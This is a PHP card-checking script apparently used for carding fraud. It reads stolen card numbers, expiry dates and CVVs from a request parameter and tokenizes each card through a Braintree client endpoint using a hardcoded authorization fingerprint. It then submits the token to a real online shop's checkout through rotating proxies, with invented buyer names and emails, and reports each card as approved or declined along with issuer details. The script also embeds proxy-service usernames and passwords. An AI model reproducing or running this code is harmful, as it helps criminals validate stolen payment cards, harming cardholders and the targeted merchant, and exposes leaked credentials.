<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}



// If(strlen($ano) > 2)
// {
//   $ano = substr($ano,2,2);
// }



 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
$lname = 'Wang';
// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
$email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
$password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);




//============================================================================================================================================================
// function updatecart(){


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/93p3x4msyc855c6k/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.15.7&authorizationFingerprint=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA1ODAzNjEsImp0aSI6IjExMTFiY2YwLWVjYTEtNGQyZC05MjMzLTUwZjFlNzBkYjJkYyIsInN1YiI6IjkzcDN4NG1zeWM4NTVjNmsiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjkzcDN4NG1zeWM4NTVjNmsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6e319.cGZhpenmguwJV_VLCo3UaJxfsKGh_KUhGVHmDHTN5v4bt_XLfXAQ4CJpTvnSpSQYdmQCPQ7CTNiEP5imq2MwmA&callback=callback_json141c9a9acd194feaafdf15d52b2ee578&share=false&&creditCard%5Bnumber%5D='.$cc1.'%20'.$cc2.'%20'.$cc3.'%20'.$cc4.'&creditCard%5BexpirationMonth%5D='.$mes.'&creditCard%5BexpirationYear%5D='.$ano.'&creditCard%5Bcvv%5D='.$cvv.'&_meta%5Bintegration%5D=dropin&_meta%5Bsource%5D=form&_method=POST');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9',
'Host: api.braintreegateway.com',
'Referer: https://assets.braintreegateway.com/dropin/2.15.7/inline-frame.html',
'user-agent: '.$browser.''
));

// curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"91dd4d08-18f3-483f-b453-18a338364b24"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');


$b_pago = curl_exec($ch);

 // echo $b_pago;
 $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
$issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
$issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
$debit = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
$prepaid = trim(strip_tags(getstr($b_pago,'"prepaid":"','"')));
$cardtype = trim(strip_tags(getstr($b_pago,'"cardType":"','"')));


// //////////////////////// START REQUEST 2 ////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.euclove.com.au/index.php?route=extension/payment/braintree_tlt/send');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: PHPSESSID=2glha2gqdqjqolb0efb0qm0ch1; default=947720h2gu19q354qulcr1kqj3; language=en-gb; currency=AUD',
'origin: https://www.euclove.com.au',
'referer: https://www.euclove.com.au/index.php?route=checkout/checkout',
'user-agent: '.$browser.'',
));

// //////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_nonce='.$token.'');



// //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);
$message = trim(strip_tags(getstr($result,'"error":"<i class=\"fa fa-exclamation-circle\"><\/i> ','"')));
// // $result = json_decode($result, true);
// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));



if(strpos($result,'"error"')){
      // updatecart();

  echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';

   }
else {
  // updatecart();

       echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
  }
curl_close($curl);
ob_flush();
// echo $result
    //echo $result;
//echo $browser;
?>
